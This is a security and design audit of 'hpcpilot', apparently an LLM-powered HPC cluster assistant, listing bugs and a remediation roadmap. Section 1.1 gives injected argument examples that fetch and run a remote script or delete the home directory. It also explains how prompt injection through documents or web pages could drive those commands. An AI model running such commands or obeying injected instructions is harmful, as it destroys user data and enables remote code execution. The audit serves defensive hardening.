# hpcpilot — Issues, Bugs & Improvement Plan

> Goal: turn `hpcpilot` into a genuinely **cluster-agnostic, batteries-included AI harness** that any HPC user can install, configure (their model / agent / docs / system prompt), and *talk to* — no bash knowledge required — with an onboarding and TUI experience on par with OpenCode / Claude Code.
>
> This document is an audit + roadmap. **No code has been changed.** It catalogs (A) bugs in the current code, (B) the design gaps that block the "agnostic, preconfigurable" vision, and (C) concrete recommendations for the three questions you raised: *model selection when users don't know model names*, *API-key trust*, and *UX*.
>
> Reference design source: `~/LLM-API/agent.py` (the 6,601-line monolith this package was refactored out of). Several capabilities that already existed there were **dropped in the refactor** — those regressions are flagged with **[REGRESSION]** below.

---

## 0. TL;DR — the five things that matter most

1. **Command injection + unconfirmed destructive ops** in `hpc/permissions.py` (`shell=True` with f-string interpolation; recursive `chgrp -R`/`chmod -R` and silent parent-dir `chmod` with no confirmation). This is LLM-driven, so it is also **prompt-injectable**. → §1.1, §1.2
2. **The system prompt is empty by default** (`agent.py:72`). The model doesn't know it's an HPC agent, doesn't know the date, the tools, or the cluster. The reference had a full prompt. **[REGRESSION]** → §2.1
3. **Model selection is static & stale; the reference's live model discovery (`/v1/models`, `opencode models`) was dropped.** This is *exactly* the "users don't know the model name" problem — and the solution already existed. **[REGRESSION]** → §6
4. **API keys are written to `~/.hpcpilot_config` in plaintext, silently, with default permissions**, including keys *scraped out of the user's `.bashrc`*. On a shared HPC filesystem this is a real credential-leak risk and directly undermines user trust. → §1.3, §7
5. **The "agnostic" claim is false today** — the tool layer is hardwired to one site (RCC/UChicago: `rcchelp`, `accounts`, `pi-` prefix, `/project/rcc/youzhi/slurm_node_monitor.db`). A new cluster cannot use this without editing Python. → §5

---

## 1. CRITICAL — security

### 1.1 Shell command injection in `hpc/permissions.py` — **[CRITICAL]**
`check_path_info` and `manage_file_permissions` build shell strings with f-strings and run them with `shell=True`:

- `permissions.py:65-66` — `f"ls -la {parent_dir} 2>/dev/null | grep -E '\\s{target_name}$'"`
- `permissions.py:93-94` — `f"ls -la {parent_dir} 2>/dev/null"`
- `permissions.py:130-131` — `f"chgrp -R {group} {path} 2>&1"`
- `permissions.py:143-144` — `f"chmod -R g={permissions} {path} 2>&1"`
- `permissions.py:167-168`, `:181-182`, `:191-192`, `:211-212` — more `ls`/`chmod` on interpolated paths.

`path`, `group`, `permissions` come straight from LLM tool arguments. A value like `/tmp/x; curl evil.sh | sh` or ``/tmp/x$(rm -rf ~)`` executes arbitrary commands. Because the arguments are produced by the model, **any prompt injection** (a poisoned doc, a web page fetched by `web_fetch`, a crafted filename in a directory listing) can drive code execution.
**Fix:** never use `shell=True`; pass argument vectors (`["chgrp", "-R", group, path]`); validate `path` (absolutize, resolve symlinks, reject shell metacharacters); validate `group` against `grp.getgrall()`; validate `permissions` against a strict regex (`^[ugoa]*[-+=][rwxXst]+$`). Replace `os.stat`-able logic with Python (`os.stat`, `grp`, `pwd`, `stat.filemode`) instead of shelling out to `ls`.

### 1.2 Destructive, recursive, *unconfirmed* mutations — **[CRITICAL]**
`manage_file_permissions` (`permissions.py:122-227`) runs `chgrp -R` and `chmod -R` over a whole subtree, then **automatically** walks every parent directory and applies `chmod g+x` / `chmod o+x` (`:181-195`) — widening permissions on directories the user may not have intended (e.g. adding world-traverse to `$HOME`). There is **no dry-run, no diff, no confirmation prompt, no undo**. `extend_slurm_job` (`jobs.py:73-80`) is similarly a state-changing `scontrol update` with no confirmation.
**Fix:** introduce a **tool risk classification** (read-only vs. mutating vs. destructive) and require explicit user confirmation (or a `--yes`/auto-approve allowlist) before any mutating tool runs — see §8.4. Default `manage_file_permissions` to a dry-run that prints the exact commands and a before/after, and only execute on confirmation.

### 1.3 API keys persisted in plaintext, silently — **[CRITICAL]**
- `JsonConfig.save()` (`config.py:20-23`) writes `~/.hpcpilot_config` with the process umask (typically world-readable-ish; **no `chmod 0600`**).
- The setup wizard writes the API key into that file (`agent.py:349, 352, 361`) with no consent and no warning.
- `_scan_shell_configs()` (`agent.py:276-299`) reads `~/.bashrc`, `~/.zshrc`, `~/.profile`, `~/.bash_profile`, `~/.zshenv`, regex-extracts every `*_API_KEY`, and the wizard then **copies the discovered key into the plaintext config** (`agent.py:347-349`).

On a shared cluster (`/home` often group/world-traversable, backed up, snapshotted), this multiplies the blast radius of a leaked key.
**Fix:** see §7 for the full trust model. Minimum: `chmod 0600` the config; never persist a secret without explicit consent; prefer *referencing* an env var / keyring entry over copying the secret; offer a "use for this session only, don't save" path; redact on screen.

### 1.4 `--dangerously-skip-permissions` / `--dangerously-bypass-approvals-and-sandbox` always on — **[HIGH]**
- Claude CLI backend hardcodes `--dangerously-skip-permissions` (`llm.py:577`).
- Codex backend defaults `codex_use_dangerous_bypass = True` (`llm.py:110`) → `--dangerously-bypass-approvals-and-sandbox` (`llm.py:367, 381`).

When the user picks a CLI backend, the sub-agent runs with **all guardrails disabled** and can do anything on the cluster. This should be opt-in, surfaced clearly in the wizard ("this lets the agent run commands without asking — y/N"), and off by default.

### 1.5 Partial secret disclosure on screen — **[LOW]**
Wizard masks a discovered key as `val[:6] + "..." + val[-4:]` (`agent.py:341`). Showing the first 6 + last 4 characters of a short token can reveal enough to be useful to a shoulder-surfer or to anyone reading a scrollback/log. Prefer showing only a provider + last-4, or nothing.

---

## 2. HIGH — correctness regressions vs. the reference design

### 2.1 Empty system prompt — **[HIGH] [REGRESSION]**
`self.system_prompt = kwargs.get("system_prompt", "")` (`agent.py:72`). With no `--system-prompt` file, every API turn sends `{"role":"system","content":""}` (`llm.py:252`). The model has no role, no tool-routing guidance, no "today's date", no "prefer the SLURM tools", no "auto-detect the current user" behavior. The reference (`~/LLM-API/agent.py:4264+`) ships a detailed `SYSTEM_PROMPT` / `SYSTEM_PROMPT_APPEND` describing the four tool tiers and the auto-user-detection rule. This is the single biggest answer-quality regression.
**Fix:** ship a strong **default, templated** system prompt (with cluster name, scheduler, today's date, tool catalog injected). Allow override/append via config (see §9). Inject the live tool list and date at runtime.

### 2.2 Backend registry is inconsistent with docs and code paths — **[HIGH]**
Several backends are referenced but not actually wired:

| Backend | In `PROVIDER_BASE_URLS`/`ENV_KEYS`? | In `KNOWN_PROVIDERS`/wizard? | Handled in `_handle_turn`? | README says? | Result |
|---|---|---|---|---|---|
| `github` (GITHUB_TOKEN) | ❌ (only in docstring `llm.py:86,91`) | ❌ | via generic chat | ✅ "GitHub Models" (`README:49`) | `--backend github` → empty base URL → POST to `/chat/completions` fails |
| `together` | ❌ (docstring only) | ❌ | generic | ❌ | dead reference |
| `custom` | ❌ | ❌ | generic | ✅ (`README:54`, `__main__.py:11,13`) | only works if BOTH `--api-base-url` and `--api-key` passed on CLI; wizard can't reach it |
| `agy` | ❌ | ❌ (not in menu) | ✅ (`agent.py:463`) | ✅ (`README:53`) | selectable only via `--backend agy`; then `_needs_setup` still forces the wizard (no key) |

**Fix:** make one **single source of truth** for the provider registry (base URL, env key, auth style, default model, whether it needs a key, whether it's a CLI backend). Add `github`, `together`, `custom` properly; include `agy` in the menu; make `_needs_setup` aware of "no-key" backends.

### 2.3 Codex conversation state is corrupted — **[HIGH]**
`run_codex_step` returns a 2-tuple `[], response_text` (`llm.py:565`), but `_handle_turn` assigns the whole tuple to `self.codex_state['conv']` (`agent.py:455`):
```python
self.codex_state['conv'] = self.llm.run_codex_step(...)  # → ([], "text")
```
So `codex_state['conv']` becomes `([], "...")` instead of a message list. The `conversation` and `tool_registry` parameters passed into `run_codex_step` are also unused. Codex multi-turn history is effectively not maintained on the Python side (it leans entirely on `thread_id`), and the return contract is mismatched.
**Fix:** define and honor a single return contract; store thread_id only, or store a real message list. Remove unused params.

### 2.4 Default model is never actually applied (zero-arg run is broken for API backends) — **[HIGH]**
- `self.model = kwargs.get("model") or self.config.get("model") or os.environ.get("OPENCODE_MODEL", "")` (`agent.py:80`) → `""` when nothing is set.
- `PROVIDER_MODEL_HINTS["opencode"] = "deepseek-v4-flash-free"` (`llm.py:44`) is only used as a *placeholder hint string* in the wizard (`agent.py:376`), never as a real default.
- Commit `ca3fa01` claims "hpcpilot works with zero args: defaults to opencode/deepseek-v4-flash-free", but with `model=""` the payload sends `"model": ""` (`llm.py:153`) → API error.
- Compounding this: `_needs_setup()` (`agent.py:264-273`) returns `True` for `opencode` when `OPENCODE_API_KEY` is unset, so a true zero-arg run actually drops into the wizard rather than "just working".

**Fix:** give each provider a real `default_model` in the registry and fall back to it; reconcile the "works with zero args" claim with `_needs_setup` (either opencode free tier needs no key — then don't force setup — or it does — then say so).

### 2.5 The entire web-recency engine is dead code — **[HIGH] [REGRESSION]**
`core/recency.py` (all of it) and most of `core/web.py` (`gather_external_web_context`, `build_freshness_search_query`, `filter_entries_for_recency`, `rank_url_for_freshness`, `build_external_web_context`, `extract_candidate_urls`, `is_fetch_failure_text`) are **never called**. Only the raw `web_search`/`web_fetch` are registered as tools (`agent.py:245-251`). So the freshness-aware, fetch-then-summarize pipeline (which the reference used to answer time-sensitive questions well) does nothing. ~400 lines of untested, unreachable code.
**Fix:** either wire `gather_external_web_context` into the turn loop (preemptive web context for time-sensitive queries) or delete the dead modules. Don't ship dormant complexity.

### 2.6 HPC tools are invisible to the CLI backends — **[HIGH]**
Only `run_chat_step` (OpenAI-compatible path) passes `self.tools` to the model (`agent.py:468`). The `codex`, `claude`, and `agy` backends get **none** of the curated HPC tools (`check_user_jobs`, `predict_pending_job_wait`, etc.). They rely on the external CLI's own bash/tools. So the agent's behavior and safety guarantees differ wildly depending on backend, while the README presents them as interchangeable. A user who picks "claude" gets a generic coding agent, not an HPC agent with these tools.
**Fix:** decide the contract. Either (a) expose the HPC tools to CLI backends too (e.g. via an MCP server the CLI connects to, or by injecting tool descriptions + a function-call protocol), or (b) document clearly that CLI backends are "bring-your-own-tools" and the curated tools are API-backend-only.

### 2.7 Documentation / skills tools are never loaded by default — **[HIGH]**
`add_doc_tool` / `load_skills` (`agent.py:478-527`) populate `doc_paths`, but **nothing calls them** in `__main__.py`. `--docs-base-path` only sets a base path; no skills file is read. So the README's "ask *how do I request GPUs?* and the agent reads the relevant doc" (`README:63`) does not work out of the box — `doc_paths` is empty, so there are no doc tools to call.
**Fix:** auto-discover a `skills.md` / `docs/` manifest from the configured docs path (or a config key) and register doc tools at startup. See §9.3.

### 2.8 `reasoning_content` is echoed back to the provider — **[HIGH]**
After tool calls, `run_chat_step` writes `m["reasoning_content"] = reasoning_content` onto the last assistant message and re-sends the whole history (`llm.py:344-348`). Many OpenAI-compatible servers (DeepSeek explicitly) **reject** requests that echo `reasoning_content` back in the assistant message, returning HTTP 400. This can break the second round-trip of any tool-using turn on reasoning models.
**Fix:** never send `reasoning_content` back upstream; keep it client-side only (for display/logging). Strip provider-only fields before re-POSTing.

### 2.9 No subprocess timeouts in `hpc/nodes.py` — **[HIGH]**
`collect_node_info_from_sinfo` (`nodes.py:80`), `collect_node_info_from_scontrol` (`:122`), `fetch_scontrol_node_metrics` (`:340`), and `fetch_cluster_nodes` (`:390`) call `subprocess.check_output`/`subprocess.run` **without `timeout=`**. On a busy or wedged SLURM controller, `scontrol show node -o` (all nodes) can hang for a long time, freezing the agent with no recovery. (Other modules correctly route through `run_cli_command` which has a timeout.)
**Fix:** route all SLURM calls through a single timeout-bounded runner; never call `subprocess` directly without a timeout.

### 2.10 Setup wizard crashes on a non-TTY (and on import on non-POSIX) — **[HIGH]**
- `core/selectors.py` imports `termios`/`tty` at module top (`:1-3`) and `interactive_select` calls `termios.tcgetattr(sys.stdin)` (`:50`). On any non-tty stdin (pipe, CI, some IDE terminals, `nohup`) this raises, and the wizard is invoked **outside** the `try/except` in `run()` (`agent.py:410-413`) → hard crash before the REPL starts.
- `import termios` fails at import time on Windows, so even importing `hpcpilot.core.selectors` (hence `hpcpilot.agent`) errors out there, despite the package being pip-installable anywhere.

**Fix:** guard interactive selection behind `sys.stdin.isatty()` with a plain-text fallback (like `read_input` already does for prompt_toolkit); lazy-import `termios`; provide a non-interactive config path (flags / env / config file) so setup never *requires* a TTY.

---

## 3. MEDIUM — robustness & correctness

- **`JsonConfig.save()` breaks for dir-less paths** (`config.py:21`): `os.makedirs(os.path.dirname(self.path), ...)` → `makedirs("")` raises `FileNotFoundError` if `config_path` is a bare filename. Guard with `os.path.dirname(...) or "."`.
- **Fragile `squeue` parsing by substring** (`accounts.py:176-177`): counting running/pending via `' R '`/`' PD '` substring matches against default `squeue` output is brittle (depends on column widths/locale). Use `squeue -h -o '%t'` and count states exactly. Same class of issue: `check_jobs_by_node` counts jobs as `len(lines)-1` (`accounts.py:286`).
- **`reasoning_content` vs `tool_calls` `elif`** (`llm.py:202-223`): `if delta.get("content")` … then `if delta.get("reasoning_content"): … elif delta.get("tool_calls")`. A delta that carries both `reasoning_content` and `tool_calls` (some reasoning models interleave) drops the tool call. Make these independent `if`s.
- **No conversation/context-window management** (`llm.py:252-253, 342-343`): full history is re-sent every turn with no truncation/summarization. Long HPC sessions will hit context limits → 400s and rising cost. Add token-budgeted trimming or summary compaction.
- **No retry/backoff on the HTTP path** for 429/5xx (`llm.py:164-242`). The codex path retries transient errors (`llm.py:542-545`) but the primary OpenAI-compatible path does not. Add bounded exponential backoff + `Retry-After` handling.
- **Hardcoded `temperature: 0.7`** (`llm.py:156`) and unconditional `reasoning_effort` (`:160-161`). Reasoning models (OpenAI `o3`/`o4-mini`, `deepseek-reasoner`) reject or ignore `temperature`, and `reasoning_effort` is not universally accepted on `/chat/completions`. The reference had `_clamp_opencode_effort` / per-model effort discovery — **[REGRESSION]**. Make sampling params provider/model-aware.
- **Claude CLI `-c` is a *global* "continue most recent"** (`llm.py:587`): `claude -c` resumes the latest conversation in the cwd, not a session bound to this process. Two hpcpilot sessions (or a prior manual `claude` run) in the same dir collide. Use explicit `--resume <session-id>` captured from the first turn's `result` event.
- **Unverified Claude CLI flags**: `--effort` (`llm.py:582,586`) and `--include-partial-messages` (`:576`) are passed unconditionally; if a given Claude CLI version doesn't support `--effort`, the process errors out. Feature-detect (`claude --help`) or guard.
- **`extend_slurm_job` error text is misleading** (`jobs.py:73-75`): "does not exist or is not yours" — but `scontrol show job` shows other users' jobs too, so the existence check doesn't prove ownership, and the real failure (insufficient privilege) is hidden. Also it's a mutation with no confirmation (see §1.2).
- **`get_partition_info` shells out to `rcchelp`** (`accounts.py:158-160`) — site-specific (see §5).
- **`read_document` path traversal** (`docs.py:7`): `os.path.join(base_path, file_path)` with an absolute or `../`-laden `file_path` escapes `base_path`. Since doc tools currently take no args this is latent, but if doc paths ever become model-supplied, validate that the resolved path stays under `base_path`.
- **`print_banner` doesn't check `isatty`** (`ui.py:452-496`): the cursor-movement animation is emitted even when stdout is redirected/piped, spraying escape codes into logs. Gate animation on `sys.stdout.isatty()`.
- **`tool_status` clobbers streamed text** when a tool fires mid-stream: it writes `\r…\033[K` over the current line; interactions with `StreamRenderer` output can leave artifacts. Needs a coherent line-ownership model.

---

## 4. LOW — cleanup, dead code, packaging, CI

- **Dead code to remove or wire up:** `interactive_select_two_phase` (`selectors.py:104-227`, unused), `_GO_BACK` sentinel (`selectors.py:6`, unused), `ToolRegistry.get_llama_tools` (`tools.py:38-50`, llama backend was removed per commit `023c646`), `convert_tools_to_openai_format` duplicates `ToolRegistry.get_openai_tools`, `rag_topic_map` (`agent.py:101`, set but never read), `register_hooks` kwarg (`agent.py:107-109`, never passed by `__main__`), and the dead web/recency modules (§2.5).
- **Unused import:** `sys` in `agent.py:3`.
- **Type hint nit:** `ToolRegistry.register(..., handler: callable)` (`tools.py:10`) should be `typing.Callable`.
- **CI quality gates are effectively disabled** (`.github/workflows/ci.yml`): `mypy … || true` (`:34`) and `pytest … || echo "No tests yet"` (`:37`) never fail the build. Only `ruff` is enforced.
- **No tests at all**, despite `pyproject.toml` declaring `[tool.pytest.ini_options] testpaths = ["tests"]` and the `dev` extra pulling in pytest/coverage. There is no `tests/` directory. The parsing-heavy `hpc/slurm.py` helpers (mem/time/GPU/state parsing) and the SSE stream parser are pure functions begging for unit tests.
- **README ↔ reality drift:** README provider table (`README:41-54`) lists `github`, `agy`, `custom` as first-class; the code doesn't fully support them (§2.2). Quickstart shows `--backend groq` with no key while the table says `GROQ_API_KEY` is required.
- **`opencode` model list is empty** (`llm.py:60`) and the other `PROVIDER_MODELS` are stale (e.g. `gpt-4o`-era OpenAI list, `grok-2`, `mixtral-8x7b`); they'll rot. → solved by dynamic discovery (§6).
- **No `--version`, `--effort`, `--list-models`, `--list-tools`, `--config-path` CLI flags**; argparse surface is minimal (`__main__.py`). `reasoning_effort` can't be set from the CLI at all, yet the banner advertises it (`agent.py:419`).
- **Local artifact hygiene:** the working tree contains `.ruff_cache/`, `.mypy_cache/`, and `hpcpilot.egg-info/`. They are correctly git-ignored (not tracked), so this is cosmetic, but a `make clean` / pre-commit cleanup target would keep the tree tidy.

---

## 5. The "agnostic" gap — it's hardwired to one cluster

The package brands itself "Agnostic HPC AI Agent framework" (`pyproject.toml:8`), but the tool layer assumes one specific site (RCC @ UChicago):

- **`/project/rcc/youzhi/slurm_node_monitor.db`** hardcoded as the snapshot DB (`nodes.py:24`) — a personal path on one cluster.
- **`rcchelp`** binary (`accounts.py:158-160`) — RCC-specific wrapper, not standard SLURM.
- **`accounts`** binary with subcommands `balance/allocations/storage/members/usage/qos/jobs/checkbalance/cycles` (`accounts.py`) — a site-local tool, not part of SLURM.
- **`pi-` account-name convention** baked into 7 functions (`accounts.py:25,44,63,92,112,137,185`).
- **`quota -u`** (`accounts.py:8`) assumes a specific quota backend; many sites use Lustre/GPFS/BeeGFS quotas with entirely different commands.
- The **`shared` partition** special-case (`accounts.py:157`).

A different cluster cannot use any of the account/quota/partition tooling without forking the Python. For a "framework," the scheduler/account/quota/storage commands must be **configuration-driven** (command templates per site), with the generic SLURM tools (`squeue`, `sinfo`, `scontrol`) as the portable base and site tools layered on via config/plugins.

**Recommendation:** split "portable SLURM core" (works on any SLURM cluster) from "site pack" (RCC commands), and let users declare their site pack in config (§9) or drop in a plugin module (§8.6). Ship the RCC pack as an *example*, not the default.

---

## 6. Model selection — "users don't know the exact model name"

This is the right problem to worry about, and **the reference already solved it** (`~/LLM-API/agent.py`): `_fetch_models_cli()` runs `opencode models`, `_fetch_models_http()` does `GET {API_BASE_URL}/models`, `list_opencode_models()` / `_validate_opencode_model()` validate the choice, and `_fetch_opencode_model_efforts()` discovers which efforts a model supports. **All of this was dropped** in `hpcpilot`, replaced by static `PROVIDER_MODELS` lists (`llm.py:53-61`) that are already stale and empty for opencode. **[REGRESSION]**

### Recommended approach (layered, "you don't need to know the name")

1. **Live discovery first.** Almost every OpenAI-compatible provider exposes `GET /v1/models`. On entering the model step, fetch the catalog with the just-entered key and present the *actual* available models. For `opencode`, also support `opencode models` via CLI (per `~/LLM-API/opencode.md`). Cache results (e.g. `~/.cache/hpcpilot/models-<provider>.json`, TTL ~24h) so the menu is instant and works offline.
2. **Fuzzy / searchable picker.** Don't make users scroll 200 models. Provide type-to-filter (the TUI already has prompt_toolkit) over the discovered list, with provider + context-window + (if available) pricing shown.
3. **Semantic aliases / tiers** so a user can say what they *want*, not the SKU:
   - `fast` / `cheap` / `smart` / `reasoning` / `vision` / `free` → resolve to the best current model for that provider. (e.g. "smart" → top frontier model; "free" → a `*-free` opencode model.)
   - Map common informal names ("gpt", "claude", "the new sonnet") to the latest matching ID via the discovered catalog.
4. **Validate before first turn.** If a model string isn't in the catalog, say so and offer the closest matches — instead of failing on the first API call with an opaque 400/404. (Reference did this via `_validate_opencode_model`.)
5. **Per-model capability handling.** Use discovered/declared capability to set sampling params correctly: don't send `temperature` to reasoning-only models; clamp/translate `reasoning_effort` per model (restore the dropped `_clamp_opencode_effort` logic). Avoid §3's 400s.
6. **Sensible defaults per provider** (registry `default_model`) so "just press Enter" always works. Show the default highlighted.
7. **Persist the *resolved* model**, but keep the alias too, so "smart" can re-resolve as catalogs evolve.

This turns model selection from "memorize an exact SKU" into "search, or pick a tier, or accept the default."

---

## 7. API-key trust — "users don't trust giving their key to the harness"

This is a legitimate concern, especially on shared HPC. The current design is the *worst* case for trust: it **silently copies secrets into a plaintext file** (incl. keys scraped from `.bashrc`), with no consent and default perms (§1.3). Here's a trust-first model.

### Threat model to state plainly (in docs + wizard)
- `hpcpilot` is a local Python process. It sends your key only to the provider endpoint you choose (over HTTPS). It does not phone home.
- The real risks are (a) a secret written to disk on a shared/backed-up filesystem, and (b) a secret echoed to a terminal/log. Design to minimize both.

### Resolution order (read), with consent (write)
1. **Process env var** (`OPENAI_API_KEY`, etc.) — already supported (`llm.py:101`). Preferred: nothing to store. Document this as the recommended path.
2. **Existing trusted tool configs**, *referenced not copied*: e.g. detect that `opencode`/`codex`/`claude` are already logged in and reuse their auth without ever reading the raw secret into our config. (For CLI backends we already shell out — lean on their own credential store.)
3. **OS keyring** (optional dep, e.g. `keyring`): store under a service name, retrieve at runtime. Never on disk in plaintext.
4. **Session-only**: "Use this key just for this session, don't save" — held in memory, never written. Make this the *default* choice in the wizard.
5. **Encrypted/0600 file, only with explicit consent**: if the user opts to persist, write `~/.config/hpcpilot/credentials` (XDG), `chmod 0600`, and store **separately from non-secret config**. Ideally store a reference (`{"openai": {"source": "env:OPENAI_API_KEY"}}` or `{"source":"keyring"}`) rather than the literal secret.

### On the `.bashrc` auto-detect feature specifically
Auto-detect is a nice UX, but:
- **Detect and *offer*, never silently copy.** Show "Found `OPENAI_API_KEY` in `~/.bashrc` — use it for this session? [persist? y/N]". Default to *reference the env var*, not duplicate the value.
- **Don't widen exposure**: if it's already in `.bashrc`, the most trust-preserving move is to just *use that env var at runtime*, leaving the single source of truth where the user already put it — not write a second plaintext copy.
- **Scope the scan**: current regex only matches `export NAME=val` (`agent.py:286`) and misses `NAME=val`, quoted/`key`-style, and `set -x` forms; either do it properly or, better, just read the *environment* (which already reflects a sourced bashrc) rather than parsing files.

### Always
- `chmod 0600` anything secret; never world/group-readable on HPC.
- Redact in all output/logs (show provider + last-4 at most, or nothing).
- A `hpcpilot logout` / `--forget-key` command to wipe stored creds.
- Be explicit in the UI about *where* a key will go and *whether* it persists, every time.

---

## 8. UX — make setup and use feel like OpenCode / Claude Code

The bones are good (prompt_toolkit input, gradient banner, markdown stream renderer, an arrow-key menu), but the experience is thin and fragile. To make it "fun to set up and use":

### 8.1 Onboarding wizard
- Make it **robust on non-TTY** (§2.10) and re-runnable (`/config` exists — good). Add a true first-run detector that doesn't depend solely on "no key".
- **Show progress** ("Step 1 of 4"), let users go back (partially there via ESC), and **verify the key live** by hitting `/models` (turns "did my key work?" from a first-turn mystery into immediate green-check feedback).
- After setup, **echo a summary** ("Provider: opencode · Model: … · Docs: … · Keys: session-only") and a couple of **example prompts** tailored to HPC ("Try: *why is job 1234 pending?*").

### 8.2 Slash commands (currently only `/config`, `/exit`)
Add the table-stakes set, OpenCode-style, with the existing fuzzy slash menu (`ui.py:31-56`):
- `/help` (list everything), `/model` (re-pick model only), `/models` (list available), `/effort <level>`, `/backend`, `/tools` (list registered tools + descriptions), `/clear` or `/new` (reset conversation), `/retry`, `/copy` (last answer), `/save` (transcript), `/docs` (what docs are loaded), `/keys` (where the key comes from), `/version`.

### 8.3 Streaming & "thinking" visibility
- Reasoning content is captured but never shown (`llm.py:204-205, 321`). OpenCode/Claude Code show a dim, collapsible "thinking" stream — surface it (dimmed, toggleable) so the agent feels alive during long reasoning.
- The `ThinkingAnim` is nice; tie it to *real* phases ("contacting model", "running `squeue`", "reading docs") instead of a generic spinner.

### 8.4 Tool-call display + approval (ties to §1.2)
- Render each tool call like Claude Code: a titled block showing tool name + key args, a spinner, then a result preview (truncated, expandable). The current `tool_status` is a single `\r` line that fights with the stream renderer.
- For **mutating/destructive** tools, show a diff/preview and an **[y/N] approval** (with "always allow this tool" to build a per-session allowlist). This is both a UX win and the §1.2 safety fix.

### 8.5 Output & terminal polish
- Use display-width-aware table layout (`fmt_table` measures `len()`, which misaligns on CJK/emoji — `ui.py:208-212`).
- Respect `NO_COLOR` / non-tty (no ANSI when piped) — gate color + banner (§3, §2.10).
- Add a persistent status line (model · effort · token usage · elapsed) like OpenCode.
- Persist input **history across sessions** (currently `InMemoryHistory`, `ui.py:27` — lost on exit). Write to `~/.local/state/hpcpilot/history`.

### 8.6 Discoverability & extensibility
- `--list-tools` and an in-TUI `/tools` so users learn what they can ask.
- A simple **plugin mechanism** for adding site tools without forking (drop a module in `~/.config/hpcpilot/plugins/` that registers tools via the existing `ToolRegistry`). `register_hooks` already hints at this (`agent.py:107`) — wire it to a real discovery path.

---

## 9. Making it preconfigurable — the "set up your own agent + docs" story

You want users to preconfigure *their* model, agent persona, docs, and cluster specifics before use. Today configuration is ad-hoc (a flat JSON of a few keys + CLI flags). Recommendations:

### 9.1 A real, documented config schema (XDG path)
Move from `~/.hpcpilot_config` (a dotfile in `$HOME`) to `~/.config/hpcpilot/config.{toml,yaml,json}` with a documented schema:
```
provider, model (or alias), effort, api_key_source (env|keyring|session|file)
cluster: { name, scheduler, account_convention, snapshot_db }
commands: { quota, accounts_balance, partition_info, ... }   # site command templates
system_prompt: path or inline; system_prompt_append
docs: { base_path, skills_file }
web: { base_path, enable }
ui: { theme, animations, show_thinking }
tools: { enabled: [...], disabled: [...], auto_approve: [...] }
```

### 9.2 Profiles
Support named profiles (`--profile rcc`, `--profile mylab`) so a user can keep one config per cluster/persona and switch instantly. (The reference's separate per-backend config files hint at this need.)

### 9.3 Docs / skills as first-class, auto-loaded
Wire `load_skills` (§2.7) to a configured `skills_file`/`docs.base_path` at startup so doc tools actually exist. Document the `# tool_name / description / path` skills format (currently only discoverable by reading `agent.py:484-527`). Consider supporting a directory of markdown with front-matter instead of the brittle blank-line-delimited format.

### 9.4 System prompt templating
Ship a default HPC system prompt (§2.1) with template variables (`{cluster_name}`, `{scheduler}`, `{today}`, `{tool_list}`, `{username}`) filled at runtime, plus an easy override/append from config. This is what lets a user "set up their own agent" without code.

### 9.5 `hpcpilot init`
A scaffolding command that writes a starter config + example `skills.md` + example site-command templates into `~/.config/hpcpilot/`, then runs the wizard. Mirrors `opencode`/`gh`/`aws configure` ergonomics.

---

## 10. Suggested priority order

| # | Item | Severity | Effort |
|---|------|----------|--------|
| 1 | Fix command injection; drop `shell=True`; validate inputs (§1.1) | Critical | M |
| 2 | Confirmation/approval for mutating & destructive tools (§1.2, §8.4) | Critical | M |
| 3 | API-key trust model: 0600, consent, session-default, no silent copy (§1.3, §7) | Critical | M |
| 4 | Default `--dangerous*` flags OFF; opt-in in wizard (§1.4) | High | S |
| 5 | Restore a real default system prompt (templated) (§2.1, §9.4) | High | S |
| 6 | Single provider registry; fix github/together/custom/agy + zero-arg default model (§2.2, §2.4) | High | M |
| 7 | Live model discovery + fuzzy picker + tiers/aliases (§6) | High | M |
| 8 | Make wizard/menus non-TTY-safe; lazy-import termios (§2.10) | High | S |
| 9 | Timeouts on all SLURM subprocess calls (§2.9) | High | S |
| 10 | Stop echoing `reasoning_content`; provider-aware sampling params (§2.8, §3) | High | S |
| 11 | Fix codex conv-state contract (§2.3) | High | S |
| 12 | Decide tool exposure for CLI backends; document or implement (§2.6) | High | M |
| 13 | Auto-load docs/skills; config schema + profiles + `init` (§2.7, §9) | High | M |
| 14 | Delete or wire the dead web-recency engine (§2.5) | Medium | S |
| 15 | Make site commands config-driven; split portable core vs. RCC pack (§5) | Medium | L |
| 16 | Slash commands, thinking stream, tool-call UI, history persistence (§8) | Medium | M |
| 17 | Context-window management + retry/backoff (§3) | Medium | M |
| 18 | Tests for parsers + stream handler; turn CI gates back on (§4) | Medium | M |
| 19 | Robustness nits (squeue parsing, config makedirs, banner isatty, etc.) (§3, §4) | Low | S |

---

*Generated as an audit of the working tree at branch `master` (uncommitted changes present in `README.md`, `agent.py`, `core/llm.py`, `core/selectors.py`, `core/ui.py`). File:line references are against the current contents and may shift as code changes.*
